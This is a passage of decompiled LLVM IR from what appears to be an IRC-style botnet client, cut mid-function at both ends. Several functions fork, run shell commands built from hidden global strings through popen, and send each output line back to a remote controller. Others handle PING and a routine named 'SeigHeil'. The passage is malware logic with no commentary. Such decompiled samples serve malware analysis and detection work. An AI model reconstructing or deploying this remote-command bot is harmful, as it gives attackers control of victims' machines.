  br i1 %v1_8055159, label %dec_label_pc_805524c, label %dec_label_pc_805515f

dec_label_pc_805515f:                             ; preds = %dec_label_pc_8055142
  %v1_8055165 = call i32 @mfork(i32 %v4_805483e)
  %v1_805516d = icmp eq i32 %v1_8055165, 0
  %v1_805516f = icmp eq i1 %v1_805516d, false
  br i1 %v1_805516f, label %dec_label_pc_805564f, label %dec_label_pc_8055175

dec_label_pc_8055175:                             ; preds = %dec_label_pc_805515f
  %v2_805517f = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8055186 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8055186 = call i32 @__GI_memset(i8* %v4_8055186, i32 0, i32 1024)
  %v3_80551a4 = call i32 @sprintf(i32 %v2_805517f, i32 ptrtoint ([114 x i8]* @global_var_806c424.581 to i32))
  store i32 %v2_805517f, i32* @eax, align 4
  %v4_80551bb = call i32 @popen(i32 %v2_805517f, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  %v1_8055228 = inttoptr i32 %v4_80551bb to i32*
  %v2_8055228168 = call i32 @feof(i32* %v1_8055228)
  %v1_8055230169 = icmp eq i32 %v2_8055228168, 0
  br i1 %v1_8055230169, label %dec_label_pc_80551c8, label %dec_label_pc_8055234

dec_label_pc_80551c8:                             ; preds = %dec_label_pc_8055175, %dec_label_pc_80551c8
  %v5_80551d9 = call i32 @__GI_memset(i8* %v4_8055186, i32 0, i32 1024)
  %v4_80551f3 = call i32 @fgets(i32 %v2_805517f, i32 1024, i32 %v4_80551bb)
  %v3_805520d = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32))
  %v1_805521a = call i32 @sleep(i32 1)
  %v2_8055228 = call i32 @feof(i32* %v1_8055228)
  %v1_8055230 = icmp eq i32 %v2_8055228, 0
  br i1 %v1_8055230, label %dec_label_pc_80551c8, label %dec_label_pc_8055234

dec_label_pc_8055234:                             ; preds = %dec_label_pc_80551c8, %dec_label_pc_8055175
  %v1_805523a = call i32 @pclose(i32 %v4_80551bb)
  %v1_8055247 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8055247, i32* @eax, align 4
  br label %dec_label_pc_805524c

dec_label_pc_805524c:                             ; preds = %dec_label_pc_8055142, %dec_label_pc_8055234
  %v3_8055256 = load i8*, i8** %stack_var_-64, align 4
  %v5_8055259 = call i32 @__GI_strncmp(i8* %v3_8055256, i32 ptrtoint ([6 x i8]* @global_var_806c496.582 to i32), i32 5)
  store i32 %v5_8055259, i32* @eax, align 4
  %v1_8055261 = icmp eq i32 %v5_8055259, 0
  %v1_8055263 = icmp eq i1 %v1_8055261, false
  br i1 %v1_8055263, label %dec_label_pc_8055356, label %dec_label_pc_8055269

dec_label_pc_8055269:                             ; preds = %dec_label_pc_805524c
  %v1_805526f = call i32 @mfork(i32 %v4_805483e)
  %v1_8055277 = icmp eq i32 %v1_805526f, 0
  %v1_8055279 = icmp eq i1 %v1_8055277, false
  br i1 %v1_8055279, label %dec_label_pc_805564f, label %dec_label_pc_805527f

dec_label_pc_805527f:                             ; preds = %dec_label_pc_8055269
  %v2_8055289 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_8055290 = bitcast i32* %stack_var_-2168 to i8*
  %v5_8055290 = call i32 @__GI_memset(i8* %v4_8055290, i32 0, i32 1024)
  %v3_80552ae = call i32 @sprintf(i32 %v2_8055289, i32 ptrtoint ([406 x i8]* @global_var_806c49c.583 to i32))
  store i32 %v2_8055289, i32* @eax, align 4
  %v4_80552c5 = call i32 @popen(i32 %v2_8055289, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  %v1_8055332 = inttoptr i32 %v4_80552c5 to i32*
  %v2_8055332166 = call i32 @feof(i32* %v1_8055332)
  %v1_805533a167 = icmp eq i32 %v2_8055332166, 0
  br i1 %v1_805533a167, label %dec_label_pc_80552d2, label %dec_label_pc_805533e

dec_label_pc_80552d2:                             ; preds = %dec_label_pc_805527f, %dec_label_pc_80552d2
  %v5_80552e3 = call i32 @__GI_memset(i8* %v4_8055290, i32 0, i32 1024)
  %v4_80552fd = call i32 @fgets(i32 %v2_8055289, i32 1024, i32 %v4_80552c5)
  %v3_8055317 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32))
  %v1_8055324 = call i32 @sleep(i32 1)
  %v2_8055332 = call i32 @feof(i32* %v1_8055332)
  %v1_805533a = icmp eq i32 %v2_8055332, 0
  br i1 %v1_805533a, label %dec_label_pc_80552d2, label %dec_label_pc_805533e

dec_label_pc_805533e:                             ; preds = %dec_label_pc_80552d2, %dec_label_pc_805527f
  %v1_8055344 = call i32 @pclose(i32 %v4_80552c5)
  %v1_8055351 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8055351, i32* @eax, align 4
  br label %dec_label_pc_8055356

dec_label_pc_8055356:                             ; preds = %dec_label_pc_805524c, %dec_label_pc_805533e
  %v3_8055360 = load i8*, i8** %stack_var_-64, align 4
  %v5_8055363 = call i32 @__GI_strncmp(i8* %v3_8055360, i32 ptrtoint ([6 x i8]* @global_var_806c632.584 to i32), i32 5)
  store i32 %v5_8055363, i32* @eax, align 4
  %v1_805536b = icmp eq i32 %v5_8055363, 0
  %v1_805536d = icmp eq i1 %v1_805536b, false
  br i1 %v1_805536d, label %dec_label_pc_8055460, label %dec_label_pc_8055373

dec_label_pc_8055373:                             ; preds = %dec_label_pc_8055356
  %v1_8055379 = call i32 @mfork(i32 %v4_805483e)
  %v1_8055381 = icmp eq i32 %v1_8055379, 0
  %v1_8055383 = icmp eq i1 %v1_8055381, false
  br i1 %v1_8055383, label %dec_label_pc_805564f, label %dec_label_pc_8055389

dec_label_pc_8055389:                             ; preds = %dec_label_pc_8055373
  %v2_8055393 = ptrtoint i32* %stack_var_-2168 to i32
  %v4_805539a = bitcast i32* %stack_var_-2168 to i8*
  %v5_805539a = call i32 @__GI_memset(i8* %v4_805539a, i32 0, i32 1024)
  %v3_80553b8 = call i32 @sprintf(i32 %v2_8055393, i32 ptrtoint ([98 x i8]* @global_var_806c638.585 to i32))
  store i32 %v2_8055393, i32* @eax, align 4
  %v4_80553cf = call i32 @popen(i32 %v2_8055393, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0))
  %v1_805543c = inttoptr i32 %v4_80553cf to i32*
  %v2_805543c164 = call i32 @feof(i32* %v1_805543c)
  %v1_8055444165 = icmp eq i32 %v2_805543c164, 0
  br i1 %v1_8055444165, label %dec_label_pc_80553dc, label %dec_label_pc_8055448

dec_label_pc_80553dc:                             ; preds = %dec_label_pc_8055389, %dec_label_pc_80553dc
  %v5_80553ed = call i32 @__GI_memset(i8* %v4_805539a, i32 0, i32 1024)
  %v4_8055407 = call i32 @fgets(i32 %v2_8055393, i32 1024, i32 %v4_80553cf)
  %v3_8055421 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32))
  %v1_805542e = call i32 @sleep(i32 1)
  %v2_805543c = call i32 @feof(i32* %v1_805543c)
  %v1_8055444 = icmp eq i32 %v2_805543c, 0
  br i1 %v1_8055444, label %dec_label_pc_80553dc, label %dec_label_pc_8055448

dec_label_pc_8055448:                             ; preds = %dec_label_pc_80553dc, %dec_label_pc_8055389
  %v1_805544e = call i32 @pclose(i32 %v4_80553cf)
  %v1_805545b = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8055460

dec_label_pc_8055460:                             ; preds = %dec_label_pc_8055356, %dec_label_pc_8055448
  %v3_8055460 = load i8*, i8** %stack_var_-64, align 4
  %v3_8055477 = call i32 @_strlen(i8* %v3_8055460)
  %v5_80554b7157 = icmp sgt i32 %v3_8055477, 0
  %v3_805548a158 = load i8*, i8** %stack_var_-64, align 4
  br i1 %v5_80554b7157, label %dec_label_pc_805548a, label %dec_label_pc_80554d4

dec_label_pc_805548a:                             ; preds = %dec_label_pc_8055460, %dec_label_pc_805549c
  %v3_805548a160 = phi i8* [ %v22_80554ab, %dec_label_pc_805549c ], [ %v3_805548a158, %dec_label_pc_8055460 ]
  %storemerge10159 = phi i32 [ %v4_80554ae, %dec_label_pc_805549c ], [ 0, %dec_label_pc_8055460 ]
  %v4_805548a = ptrtoint i8* %v3_805548a160 to i32
  %v2_805548d = load i8, i8* %v3_805548a160, align 1
  %v5_805548d = and i32 %v4_805548a, -256
  %v7_805548f = icmp eq i8 %v2_805548d, 32
  br i1 %v7_805548f, label %dec_label_pc_80554d4, label %dec_label_pc_8055493

dec_label_pc_8055493:                             ; preds = %dec_label_pc_805548a
  %v2_8055496 = load i8, i8* %v3_805548a160, align 1
  %v4_8055498 = icmp eq i8 %v2_8055496, 0
  br i1 %v4_8055498, label %dec_label_pc_80554d4, label %dec_label_pc_805549c

dec_label_pc_805549c:                             ; preds = %dec_label_pc_8055493
  store i32 %v4_805548a, i32* %edx.global-to-local, align 4
  %v2_80554a2 = load i8, i8* %v3_805548a160, align 1
  %v3_80554a2 = zext i8 %v2_80554a2 to i32
  %v6_80554a2 = or i32 %v3_80554a2, %v5_805548d
  store i32 %v6_80554a2, i32* %edx.global-to-local, align 4
  %v2_80554a4 = load i32, i32* @ebp, align 4
  %v4_80554a4 = add nsw i32 %storemerge10159, -1140
  %v5_80554a4 = add i32 %v4_80554a4, %v2_80554a4
  %v6_80554a4 = inttoptr i32 %v5_80554a4 to i8*
  store i8 %v2_80554a2, i8* %v6_80554a4, align 1
  %v3_80554ab = load i8*, i8** %stack_var_-64, align 4
  %v4_80554ab = ptrtoint i8* %v3_80554ab to i32
  %v5_80554ab = add i32 %v4_80554ab, 1
  %v22_80554ab = inttoptr i32 %v5_80554ab to i8*
  store i8* %v22_80554ab, i8** %stack_var_-64, align 4
  %v4_80554ae = add nuw nsw i32 %storemerge10159, 1
  %v5_80554b7 = icmp slt i32 %v4_80554ae, %v3_8055477
  br i1 %v5_80554b7, label %dec_label_pc_805548a, label %dec_label_pc_80554d4

dec_label_pc_80554c2:                             ; preds = %dec_label_pc_80554d4
  %v4_80554c5 = load i8*, i8** %stack_var_-64, align 4
  %v5_80554c5 = ptrtoint i8* %v4_80554c5 to i32
  %v6_80554c5 = add i32 %v5_80554c5, %storemerge9
  %v1_80554c8 = inttoptr i32 %v6_80554c5 to i8*
  %v2_80554c8 = load i8, i8* %v1_80554c8, align 1
  %v7_80554ca = icmp eq i8 %v2_80554c8, 32
  %v1_80554cc = icmp eq i1 %v7_80554ca, false
  br i1 %v1_80554cc, label %dec_label_pc_80554d1, label %dec_label_pc_80554ce

dec_label_pc_80554ce:                             ; preds = %dec_label_pc_80554c2
  %v4_80554ce = add i32 %stack_var_-60.1, 1
  br label %dec_label_pc_80554d1

dec_label_pc_80554d1:                             ; preds = %dec_label_pc_80554c2, %dec_label_pc_80554ce
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.1, %dec_label_pc_80554c2 ], [ %v4_80554ce, %dec_label_pc_80554ce ]
  %v4_80554d1 = add i32 %storemerge9, 1
  br label %dec_label_pc_80554d4

dec_label_pc_80554d4:                             ; preds = %dec_label_pc_8055460, %dec_label_pc_8055493, %dec_label_pc_805548a, %dec_label_pc_805549c, %dec_label_pc_80554d1
  %v3_80554d7 = phi i8* [ %v4_80554c5, %dec_label_pc_80554d1 ], [ %v3_805548a158, %dec_label_pc_8055460 ], [ %v3_805548a160, %dec_label_pc_8055493 ], [ %v3_805548a160, %dec_label_pc_805548a ], [ %v22_80554ab, %dec_label_pc_805549c ]
  %stack_var_-60.1 = phi i32 [ %stack_var_-60.0, %dec_label_pc_80554d1 ], [ 0, %dec_label_pc_8055460 ], [ 0, %dec_label_pc_8055493 ], [ 0, %dec_label_pc_805548a ], [ 0, %dec_label_pc_805549c ]
  %storemerge9 = phi i32 [ %v4_80554d1, %dec_label_pc_80554d1 ], [ 0, %dec_label_pc_8055460 ], [ 0, %dec_label_pc_8055493 ], [ 0, %dec_label_pc_805548a ], [ 0, %dec_label_pc_805549c ]
  store i32 %storemerge9, i32* %edx.global-to-local, align 4
  %v4_80554d7 = ptrtoint i8* %v3_80554d7 to i32
  store i1 false, i1* @df, align 1
  store i32 %v4_80554d7, i32* @edi, align 4
  %v3_80554ee = call i32 @_strlen(i8* %v3_80554d7)
  %v7_80554f5 = icmp ult i32 %storemerge9, %v3_80554ee
  br i1 %v7_80554f5, label %dec_label_pc_80554c2, label %dec_label_pc_80554f9

dec_label_pc_80554f9:                             ; preds = %dec_label_pc_80554d4
  %v4_80554f9 = add i32 %stack_var_-60.1, 1
  %v7_8055500 = icmp sgt i32 %v4_80554f9, 10
  %.v4_80554f9 = select i1 %v7_8055500, i32 10, i32 %v4_80554f9
  %v0_8055516 = load i32, i32* @ebp, align 4
  %tmp = mul i32 %.v4_80554f9, 4
  %v3_8055516 = add i32 %tmp, -112
  %v4_8055516 = add i32 %v3_8055516, %v0_8055516
  %v5_8055516 = inttoptr i32 %v4_8055516 to i32*
  store i32 ptrtoint (i32* @global_var_8068669.586 to i32), i32* %v5_8055516, align 4
  %tmp132 = bitcast i8** %stack_var_-64 to i32*
  %v3_80555c0.pre = load i8*, i8** %stack_var_-64, align 4
  %v4_80555c0144 = ptrtoint i8* %v3_80555c0.pre to i32
  %v2_80555c3145 = load i8, i8* %v3_80555c0.pre, align 1
  %v4_80555c5149 = icmp eq i8 %v2_80555c3145, 0
  %v1_80555c7150 = icmp eq i1 %v4_80555c5149, false
  br i1 %v1_80555c7150, label %dec_label_pc_805552a, label %dec_label_pc_80555cd

dec_label_pc_805552a:                             ; preds = %dec_label_pc_80554f9, %dec_label_pc_8055576
  %v4_80555c0152 = phi i32 [ %v6_80555bd, %dec_label_pc_8055576 ], [ %v4_80555c0144, %dec_label_pc_80554f9 ]
  %stack_var_-56.0151 = phi i32 [ %v4_80555b7, %dec_label_pc_8055576 ], [ 1, %dec_label_pc_80554f9 ]
  %v5_805552a = add i32 %v4_80555c0152, 1
  %v22_805552a = inttoptr i32 %v5_805552a to i8*
  store i8* %v22_805552a, i8** %stack_var_-64, align 4
  %v5_8055533 = icmp slt i32 %stack_var_-56.0151, %.v4_80554f9
  br i1 %v5_8055533, label %dec_label_pc_8055545, label %dec_label_pc_80555cd

dec_label_pc_8055542:                             ; preds = %dec_label_pc_805556a
  %v4_8055542 = add i32 %storemerge8, 1
  br label %dec_label_pc_8055545

dec_label_pc_8055545:                             ; preds = %dec_label_pc_805552a, %dec_label_pc_8055542
  %v3_8055548 = phi i8* [ %v4_805556d, %dec_label_pc_8055542 ], [ %v22_805552a, %dec_label_pc_805552a ]
  %storemerge8 = phi i32 [ %v4_8055542, %dec_label_pc_8055542 ], [ 0, %dec_label_pc_805552a ]
  store i32 %storemerge8, i32* %edx.global-to-local, align 4
  %v4_8055548 = ptrtoint i8* %v3_8055548 to i32
  store i1 false, i1* @df, align 1
  store i32 %v4_8055548, i32* @edi, align 4
  %v3_805555f = call i32 @_strlen(i8* %v3_8055548)
  %v4_805555f = mul i32 %v3_805555f, -1
  %v5_805555f = add i32 %v4_805555f, -2
  store i32 %v5_805555f, i32* @ecx, align 4
  %v1_8055565 = sub i32 0, %v4_805555f
  %v0_8055566 = load i32, i32* %edx.global-to-local, align 4
  %v7_8055566 = icmp ult i32 %v0_8055566, %v1_8055565
  %v1_8055568 = icmp eq i1 %v7_8055566, false
  br i1 %v1_8055568, label %dec_label_pc_8055576, label %dec_label_pc_805556a

dec_label_pc_805556a:                             ; preds = %dec_label_pc_8055545
  %v4_805556d = load i8*, i8** %stack_var_-64, align 4
  %v5_805556d = ptrtoint i8* %v4_805556d to i32
  %v6_805556d = add i32 %v5_805556d, %storemerge8
  %v1_8055570 = inttoptr i32 %v6_805556d to i8*
  %v2_8055570 = load i8, i8* %v1_8055570, align 1
  %v7_8055572 = icmp eq i8 %v2_8055570, 32
  %v1_8055574 = icmp eq i1 %v7_8055572, false
  br i1 %v1_8055574, label %dec_label_pc_8055542, label %dec_label_pc_8055576

dec_label_pc_8055576:                             ; preds = %dec_label_pc_805556a, %dec_label_pc_8055545
  store i32 %stack_var_-56.0151, i32* @ebx, align 4
  %v1_805557c = add i32 %storemerge8, 1
  %v1_8055581 = call i32 @malloc(i32 %v1_805557c)
  %v1_8055589 = load i32, i32* @ebp, align 4
  %v2_8055589 = load i32, i32* @ebx, align 4
  %v3_8055589 = mul i32 %v2_8055589, 4
  %v4_8055589 = add i32 %v1_8055589, -116
  %v5_8055589 = add i32 %v4_8055589, %v3_8055589
  %v6_8055589 = inttoptr i32 %v5_8055589 to i32*
  store i32 %v1_8055581, i32* %v6_8055589, align 4
  store i32 %storemerge8, i32* %edx.global-to-local, align 4
  %v0_8055593 = load i32, i32* @ebp, align 4
  %v2_8055593 = mul nuw nsw i32 %stack_var_-56.0151, 4
  %v3_8055593 = add nuw nsw i32 %v2_8055593, -116
  %v4_8055593 = add i32 %v0_8055593, %v3_8055593
  %v5_8055593 = inttoptr i32 %v4_8055593 to i32*
  %v6_8055593 = load i32, i32* %v5_8055593, align 4
  %v3_805559b7 = load i32, i32* %tmp132, align 4
  %v4_805559f = inttoptr i32 %v6_8055593 to i8*
  %v5_805559f = call i32 @strncpy(i8* %v4_805559f, i32 %v3_805559b7, i32 %storemerge8)
  %v0_80555aa = load i32, i32* @ebp, align 4
  %v4_80555aa = add i32 %v0_80555aa, %v3_8055593
  %v5_80555aa = inttoptr i32 %v4_80555aa to i32*
  %v6_80555aa = load i32, i32* %v5_80555aa, align 4
  store i32 %v6_80555aa, i32* %edx.global-to-local, align 4
  %v2_80555b1 = add i32 %v6_80555aa, %storemerge8
  %v1_80555b4 = inttoptr i32 %v2_80555b1 to i8*
  store i8 0, i8* %v1_80555b4, align 1
  %v4_80555b7 = add nuw nsw i32 %stack_var_-56.0151, 1
  %v3_80555bd = load i8*, i8** %stack_var_-64, align 4
  %v4_80555bd = ptrtoint i8* %v3_80555bd to i32
  %v6_80555bd = add i32 %v4_80555bd, %storemerge8
  %v26_80555bd = inttoptr i32 %v6_80555bd to i8*
  store i8* %v26_80555bd, i8** %stack_var_-64, align 4
  %v2_80555c3 = load i8, i8* %v26_80555bd, align 1
  %v4_80555c5 = icmp eq i8 %v2_80555c3, 0
  %v1_80555c7 = icmp eq i1 %v4_80555c5, false
  br i1 %v1_80555c7, label %dec_label_pc_805552a, label %dec_label_pc_80555cd

dec_label_pc_80555cd:                             ; preds = %dec_label_pc_8055576, %dec_label_pc_805552a, %dec_label_pc_80554f9
  %v4_8055644 = load i32, i32* bitcast ([4 x i8]** @global_var_806ffc0.588 to i32*), align 8
  %v1_805564b = icmp eq i32 %v4_8055644, 0
  %v1_805564d = icmp eq i1 %v1_805564b, false
  br i1 %v1_805564d, label %dec_label_pc_80555d6, label %dec_label_pc_805564f

dec_label_pc_80555d6:                             ; preds = %dec_label_pc_80555cd
  store i32 %v4_8055644, i32* %edx.global-to-local, align 4
  %v3_80555eb = inttoptr i32 %v4_8055644 to i8*
  %v4_80555eb = call i32 @__GI_strcasecmp(i8* %v3_80555eb, i32 %v2_8054918)
  %v4_80555fa = load i32, i32* @global_var_806ffc4.589, align 4
  store i32 %v4_80555fa, i32* @ecx, align 4
  %v1_8055604 = add i32 %.v4_80554f9, -1
  store i32 %v1_8055604, i32* %edx.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_80555fa)
  %v5_805563a142 = icmp sgt i32 %.v4_80554f9, 1
  br i1 %v5_805563a142, label %dec_label_pc_805561e.lr.ph, label %dec_label_pc_805564f

dec_label_pc_805561e.lr.ph:                       ; preds = %dec_label_pc_80555d6
  br label %dec_label_pc_805561e

dec_label_pc_805561e:                             ; preds = %dec_label_pc_805561e.lr.ph, %dec_label_pc_805561e
  %storemerge143 = phi i32 [ 1, %dec_label_pc_805561e.lr.ph ], [ %v4_8055631, %dec_label_pc_805561e ]
  %v0_8055621 = load i32, i32* @ebp, align 4
  %v2_8055621 = mul nuw nsw i32 %storemerge143, 4
  %v3_8055621 = add nuw nsw i32 %v2_8055621, -116
  %v4_8055621 = add i32 %v3_8055621, %v0_8055621
  %v5_8055621 = inttoptr i32 %v4_8055621 to i32*
  %v6_8055621 = load i32, i32* %v5_8055621, align 4
  %v1_8055629 = call i32 @free(i32 %v6_8055621)
  %v4_8055631 = add nuw nsw i32 %storemerge143, 1
  %v5_805563a = icmp slt i32 %v4_8055631, %.v4_80554f9
  br i1 %v5_805563a, label %dec_label_pc_805561e, label %dec_label_pc_805564f

dec_label_pc_805564f:                             ; preds = %dec_label_pc_80555d6, %dec_label_pc_805561e, %dec_label_pc_80555cd, %dec_label_pc_8055373, %dec_label_pc_8055269, %dec_label_pc_805515f, %dec_label_pc_8055055, %dec_label_pc_8054f4b, %dec_label_pc_8054e41, %dec_label_pc_8054d37, %dec_label_pc_8054c2d, %dec_label_pc_8054b23, %dec_label_pc_8054a19, %dec_label_pc_8054979, %dec_label_pc_80548fc, %dec_label_pc_80548e6, %entry
  %v0_8055655 = phi i32 [ %v4_8055644, %dec_label_pc_80555cd ], [ %v1_8055379, %dec_label_pc_8055373 ], [ %v1_805526f, %dec_label_pc_8055269 ], [ %v1_8055165, %dec_label_pc_805515f ], [ %v1_805505b, %dec_label_pc_8055055 ], [ %v1_8054f51, %dec_label_pc_8054f4b ], [ %v1_8054e47, %dec_label_pc_8054e41 ], [ %v1_8054d3d, %dec_label_pc_8054d37 ], [ %v1_8054c33, %dec_label_pc_8054c2d ], [ %v1_8054b29, %dec_label_pc_8054b23 ], [ %v1_8054a1f, %dec_label_pc_8054a19 ], [ %v4_805498e, %dec_label_pc_8054979 ], [ %v4_8054908, %dec_label_pc_80548fc ], [ %v6_80548f2, %dec_label_pc_80548e6 ], [ 0, %entry ], [ 1, %dec_label_pc_80555d6 ], [ %.v4_80554f9, %dec_label_pc_805561e ]
  ret i32 %v0_8055655

; uselistorder directives
  uselistorder i32 %storemerge143, { 1, 0 }
  uselistorder i32 %v6_80555bd, { 1, 0 }
  uselistorder i8* %v4_805556d, { 1, 0 }
  uselistorder i32 %storemerge8, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i8* %v3_8055548, { 1, 0 }
  uselistorder i32 %stack_var_-56.0151, { 3, 2, 1, 0 }
  uselistorder i32 %.v4_80554f9, { 1, 5, 2, 4, 3, 0 }
  uselistorder i32 %storemerge9, { 0, 3, 1, 2 }
  uselistorder i8* %v3_80554d7, { 1, 0 }
  uselistorder i32 %v4_80554ae, { 1, 0 }
  uselistorder i8* %v22_80554ab, { 0, 2, 1 }
  uselistorder i8* %v3_805548a160, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32* %v1_805543c, { 1, 0 }
  uselistorder i32 %v4_80553cf, { 1, 0, 2 }
  uselistorder i32* %v1_8055332, { 1, 0 }
  uselistorder i32 %v4_80552c5, { 1, 0, 2 }
  uselistorder i32* %v1_8055228, { 1, 0 }
  uselistorder i32 %v4_80551bb, { 1, 0, 2 }
  uselistorder i32* %v1_805511e, { 1, 0 }
  uselistorder i32 %v4_80550b1, { 1, 0, 2 }
  uselistorder i32* %v1_8055014, { 1, 0 }
  uselistorder i32 %v4_8054fa7, { 1, 0, 2 }
  uselistorder i32* %v1_8054f0a, { 1, 0 }
  uselistorder i32 %v4_8054e9d, { 1, 0, 2 }
  uselistorder i32* %v1_8054e00, { 1, 0 }
  uselistorder i32 %v4_8054d93, { 1, 0, 2 }
  uselistorder i32* %v1_8054cf6, { 1, 0 }
  uselistorder i32 %v4_8054c89, { 1, 0, 2 }
  uselistorder i32* %v1_8054bec, { 1, 0 }
  uselistorder i32 %v4_8054b7f, { 1, 0, 2 }
  uselistorder i32* %v1_8054ae2, { 1, 0 }
  uselistorder i32 %v4_8054a75, { 1, 0, 2 }
  uselistorder i32 %storemerge11, { 2, 1, 0, 4, 3 }
  uselistorder i8* %v3_805494b, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %storemerge13, { 1, 0, 3, 2 }
  uselistorder i32 %v4_805483e, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 11, 12 }
  uselistorder i32* %stack_var_-2168, { 0, 10, 1, 11, 2, 12, 3, 13, 4, 14, 5, 15, 6, 16, 7, 17, 8, 18, 9, 19 }
  uselistorder i8** %stack_var_-64, { 28, 27, 26, 25, 1, 3, 24, 23, 22, 0, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 2, 7, 6, 5, 4 }
  uselistorder i32 (i32)* @pclose, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_806bba5.567 to i32), { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32*)* @feof, { 10, 9, 11, 8, 12, 7, 13, 6, 14, 5, 15, 4, 16, 3, 17, 2, 18, 1, 19, 0 }
  uselistorder [2 x i8]* @global_var_8068ea3.83, { 1, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8068ea3.83, i32 0, i32 0), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([30 x i8]* @global_var_806884c.30 to i32), { 1, 0 }
  uselistorder i8* @global_var_80748e8.28, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805564f, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_805561e, { 1, 0 }
  uselistorder label %dec_label_pc_8055545, { 1, 0 }
  uselistorder label %dec_label_pc_805552a, { 1, 0 }
  uselistorder label %dec_label_pc_80554d4, { 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80554d1, { 1, 0 }
  uselistorder label %dec_label_pc_805548a, { 1, 0 }
  uselistorder label %dec_label_pc_8055460, { 1, 0 }
  uselistorder label %dec_label_pc_80553dc, { 1, 0 }
  uselistorder label %dec_label_pc_8055356, { 1, 0 }
  uselistorder label %dec_label_pc_80552d2, { 1, 0 }
  uselistorder label %dec_label_pc_805524c, { 1, 0 }
  uselistorder label %dec_label_pc_80551c8, { 1, 0 }
  uselistorder label %dec_label_pc_8055142, { 1, 0 }
  uselistorder label %dec_label_pc_80550be, { 1, 0 }
  uselistorder label %dec_label_pc_8055038, { 1, 0 }
  uselistorder label %dec_label_pc_8054fb4, { 1, 0 }
  uselistorder label %dec_label_pc_8054f2e, { 1, 0 }
  uselistorder label %dec_label_pc_8054eaa, { 1, 0 }
  uselistorder label %dec_label_pc_8054e24, { 1, 0 }
  uselistorder label %dec_label_pc_8054da0, { 1, 0 }
  uselistorder label %dec_label_pc_8054d1a, { 1, 0 }
  uselistorder label %dec_label_pc_8054c96, { 1, 0 }
  uselistorder label %dec_label_pc_8054c10, { 1, 0 }
  uselistorder label %dec_label_pc_8054b8c, { 1, 0 }
  uselistorder label %dec_label_pc_8054b06, { 1, 0 }
  uselistorder label %dec_label_pc_8054a82, { 1, 0 }
  uselistorder label %dec_label_pc_80549fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054979, { 1, 0 }
  uselistorder label %dec_label_pc_8054948, { 1, 0 }
  uselistorder label %dec_label_pc_80548e6, { 1, 0 }
  uselistorder label %dec_label_pc_80548b5, { 1, 0 }
  uselistorder label %dec_label_pc_805485d, { 1, 0 }
}

define i32 @_376(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805566d = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_806c69a.590 to i32))
  %v3_805568a = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_806c6a7.592 to i32))
  %v3_80556a3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_806c6b4.593 to i32))
  %v0_80556ab = load i32, i32* @global_var_80748e0.351, align 32
  %v1_80556b0 = icmp eq i32 %v0_80556ab, 0
  %v1_80556b2 = icmp eq i1 %v1_80556b0, false
  br i1 %v1_80556b2, label %dec_label_pc_80556c2, label %dec_label_pc_80556b4

dec_label_pc_80556b4:                             ; preds = %entry
  %v1_80556ba = call i32 @SeigHeil(i32 %arg1)
  br label %dec_label_pc_80556c2

dec_label_pc_80556c2:                             ; preds = %entry, %dec_label_pc_80556b4
  %v0_80556c3 = phi i32 [ %v0_80556ab, %entry ], [ %v1_80556ba, %dec_label_pc_80556b4 ]
  ret i32 %v0_80556c3

; uselistorder directives
  uselistorder i32 (i32)* @SeigHeil, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80556c2, { 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_80556d8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_806c6bc.594 to i32))
  ret i32 %v3_80556d8
}

define i32 @_352(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8, align 1
  br label %dec_label_pc_8055706.preheader

dec_label_pc_8055700:                             ; preds = %dec_label_pc_8055725
  %v5_8055700 = add i32 %.pre32, 1
  %v22_8055700 = inttoptr i32 %v5_8055700 to i8*
